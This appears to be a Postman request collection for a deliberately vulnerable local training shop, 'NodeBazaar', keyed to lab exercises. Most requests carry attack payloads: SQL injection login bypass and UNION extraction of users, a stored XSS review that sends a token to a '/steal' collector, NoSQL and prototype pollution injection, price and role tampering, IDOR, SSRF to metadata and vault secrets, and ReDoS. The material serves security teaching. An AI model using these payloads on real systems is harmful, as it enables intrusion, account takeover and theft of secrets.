@@ -1,0 +1,230 @@
+{
+  "info": {
+    "name": "NodeBazaar",
+    "description": "Requests for the intentionally vulnerable NodeBazaar shop. baseUrl = http://localhost:8888. Log in first (the Login requests save the session cookie automatically). Every lab in docs/labs/ has at least one request here.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "baseUrl", "value": "http://localhost:8888" },
+    { "key": "token", "value": "" }
+  ],
+  "item": [
+    {
+      "name": "Auth",
+      "item": [
+        {
+          "name": "Login as alice",
+          "event": [{ "listen": "test", "script": { "exec": ["pm.test('302', () => pm.response.to.have.status(302));"] } }],
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+            "body": { "mode": "urlencoded", "urlencoded": [
+              { "key": "username", "value": "alice" },
+              { "key": "password", "value": "alice123" }
+            ]},
+            "url": { "raw": "{{baseUrl}}/login/auth", "host": ["{{baseUrl}}"], "path": ["login", "auth"] }
+          }
+        },
+        {
+          "name": "03 Login bypass (SQLi)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+            "body": { "mode": "urlencoded", "urlencoded": [
+              { "key": "username", "value": "admin'--" },
+              { "key": "password", "value": "x" }
+            ]},
+            "url": { "raw": "{{baseUrl}}/login/auth", "host": ["{{baseUrl}}"], "path": ["login", "auth"] }
+          }
+        },
+        {
+          "name": "06b CSRF-like profile change (needs session)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+            "body": { "mode": "urlencoded", "urlencoded": [
+              { "key": "email", "value": "alice@example.com" },
+              { "key": "role", "value": "admin" },
+              { "key": "balance", "value": "999999" }
+            ]},
+            "url": { "raw": "{{baseUrl}}/account", "host": ["{{baseUrl}}"], "path": ["account"] }
+          }
+        },
+        {
+          "name": "13 Prototype pollution",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": { "mode": "raw", "raw": "{\"__proto__\":{\"isAdmin\":true}}" },
+            "url": { "raw": "{{baseUrl}}/preferences", "host": ["{{baseUrl}}"], "path": ["preferences"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Shop",
+      "item": [
+        {
+          "name": "03 Search tautology (SQLi)",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "{{baseUrl}}/search?q=' OR '1'='1", "host": ["{{baseUrl}}"], "path": ["search"], "query": [{ "key": "q", "value": "' OR '1'='1" }] }
+          }
+        },
+        {
+          "name": "03 Search UNION users",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "{{baseUrl}}/search?q=' UNION SELECT 1,username,email,0,'e',6,'{v}' FROM users--", "host": ["{{baseUrl}}"], "path": ["search"], "query": [{ "key": "q", "value": "' UNION SELECT 1,username,email,0,'e',6,'{v}' FROM users--" }] }
+          }
+        },
+        {
+          "name": "Product detail",
+          "request": { "method": "GET", "url": { "raw": "{{baseUrl}}/products/2", "host": ["{{baseUrl}}"], "path": ["products", "2"] } }
+        },
+        {
+          "name": "05 Post XSS review",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+            "body": { "mode": "urlencoded", "urlencoded": [
+              { "key": "rating", "value": "5" },
+              { "key": "body", "value": "<img src=x onerror=\"fetch('http://localhost:8890/steal?t='+localStorage.nodebazaar_token)\">" }
+            ]},
+            "url": { "raw": "{{baseUrl}}/products/2/reviews", "host": ["{{baseUrl}}"], "path": ["products", "2", "reviews"] }
+          }
+        },
+        {
+          "name": "06 Price tamper",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+            "body": { "mode": "urlencoded", "urlencoded": [
+              { "key": "product_id", "value": "1" },
+              { "key": "product_name", "value": "Mechanical Keyboard MK-ULTRA" },
+              { "key": "quantity", "value": "1" },
+              { "key": "amount_cents", "value": "1" },
+              { "key": "address", "value": "1 Main Street" },
+              { "key": "card_number", "value": "4242 4242 4242 4242" },
+              { "key": "cvv", "value": "123" }
+            ]},
+            "url": { "raw": "{{baseUrl}}/checkout", "host": ["{{baseUrl}}"], "path": ["checkout"] }
+          }
+        },
+        {
+          "name": "03 Sort injection (ORDER BY)",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "{{baseUrl}}/orders?sort=nope", "host": ["{{baseUrl}}"], "path": ["orders"], "query": [{ "key": "sort", "value": "nope" }] }
+          }
+        },
+        {
+          "name": "01 IDOR: read bob's order",
+          "request": { "method": "GET", "url": { "raw": "{{baseUrl}}/orders/1", "host": ["{{baseUrl}}"], "path": ["orders", "1"] } }
+        },
+        {
+          "name": "03b NoSQL $ne via GET",
+          "request": {
+            "method": "GET",
+            "url": { "raw": "{{baseUrl}}/api/meta?origin[$ne]=null", "host": ["{{baseUrl}}"], "path": ["api", "meta"], "query": [{ "key": "origin[$ne]", "value": "null" }] }
+          }
+        },
+        {
+          "name": "03b NoSQL $ne via POST JSON",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": { "mode": "raw", "raw": "{\"tags\":{\"$ne\":null}}" },
+            "url": { "raw": "{{baseUrl}}/api/tags-filter", "host": ["{{baseUrl}}"], "path": ["api", "tags-filter"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "Tools & SSRF",
+      "item": [
+        {
+          "name": "02 SSRF: metadata listing",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+            "body": { "mode": "urlencoded", "urlencoded": [{ "key": "url", "value": "http://imds:8090/latest/meta-data/" }] },
+            "url": { "raw": "{{baseUrl}}/tools/fetch", "host": ["{{baseUrl}}"], "path": ["tools", "fetch"] }
+          }
+        },
+        {
+          "name": "02 SSRF: IMDS token",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+            "body": { "mode": "urlencoded", "urlencoded": [{ "key": "url", "value": "http://imds:8090/latest/api/token" }] },
+            "url": { "raw": "{{baseUrl}}/tools/fetch", "host": ["{{baseUrl}}"], "path": ["tools", "fetch"] }
+          }
+        },
+        {
+          "name": "02 SSRF: vault secret (needs token)",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+            "body": { "mode": "urlencoded", "urlencoded": [
+              { "key": "url", "value": "http://vault:8091/secrets/pipeline" },
+              { "key": "token", "value": "IMDS-TOKEN-3f9a2c" }
+            ]},
+            "url": { "raw": "{{baseUrl}}/tools/fetch", "host": ["{{baseUrl}}"], "path": ["tools", "fetch"] }
+          }
+        },
+        {
+          "name": "02 SSRF: vault-check one-shot",
+          "request": { "method": "GET", "url": { "raw": "{{baseUrl}}/tools/vault-check", "host": ["{{baseUrl}}"], "path": ["tools", "vault-check"] } }
+        },
+        {
+          "name": "14 ReDoS",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+            "body": { "mode": "urlencoded", "urlencoded": [
+              { "key": "pattern", "value": "^(\\d+)*$" },
+              { "key": "input", "value": "1111111111111111111111111111111X" }
+            ]},
+            "url": { "raw": "{{baseUrl}}/tools/regex", "host": ["{{baseUrl}}"], "path": ["tools", "regex"] }
+          }
+        }
+      ]
+    },
+    {
+      "name": "API v1 (JWT)",
+      "item": [
+        {
+          "name": "Get token (alice)",
+          "event": [{ "listen": "test", "script": { "exec": [
+            "pm.test('200', () => pm.response.to.have.status(200));",
+            "const body = pm.response.json();",
+            "pm.collectionVariables.set('token', body.token);"
+          ] } }],
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "body": { "mode": "raw", "raw": "{\"username\":\"alice\",\"password\":\"alice123\"}" },
+            "url": { "raw": "{{baseUrl}}/api/v1/auth/token", "host": ["{{baseUrl}}"], "path": ["api", "v1", "auth", "token"] }
+          }
+        },
+        {
+          "name": "01 API IDOR: bob's orders",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
+            "url": { "raw": "{{baseUrl}}/api/v1/orders?user_id=2", "host": ["{{baseUrl}}"], "path": ["api", "v1", "orders"], "query": [{ "key": "user_id", "value": "2" }] }
+          }
+        },
+        {
+          "name": "Me",
+          "request": {
+            "method": "GET",
+            "header": [{ "key": "Authorization", "value": "Bearer {{token}}" }],
+            "url": { "raw": "{{baseUrl}}/api/v1/me", "host": ["{{baseUrl}}"], "path": ["api", "v1", "me"] }
+          }
+        }
+      ]
+    }
+  ]
+}
